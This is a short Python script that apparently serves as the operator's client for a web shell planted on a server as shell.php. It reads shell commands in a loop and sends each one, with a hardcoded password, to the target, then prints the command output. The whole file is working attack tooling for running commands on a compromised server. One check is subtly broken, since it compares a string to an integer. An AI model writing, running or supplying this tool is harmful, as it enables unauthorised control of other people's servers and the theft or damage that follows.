# password = D@ve'sMag!cBall$

import requests
import sys
from bs4 import BeautifulSoup


def init():
    target = input("Enter Target IP Address (must have shell.php loaded): ")
    ssl = input("HTTP (0 or press enter) or HTTPS (1): ")
    if ssl == 1:
        target = "https://" + target + "/shell.php"
    else:
        target = "http://" + target + "/shell.php"
    password = "D@ve'sMag!cBall$"
    return target, password


def main():
    data = init()
    print("Establishing Web Shell with server %s" % data[0])
    while True:
        cmd = str(input("$ "))
        if cmd == "exit":
            sys.exit(1)
        try:
            r = requests.get(data[0], params={'cmd': cmd, 'password': data[1]})
            output = BeautifulSoup(r.text, 'html.parser')
            print(output.pre.text)
        except requests.exceptions.RequestException as e:
            print(e)
            sys.exit(1)


if __name__ == "__main__":
    main()


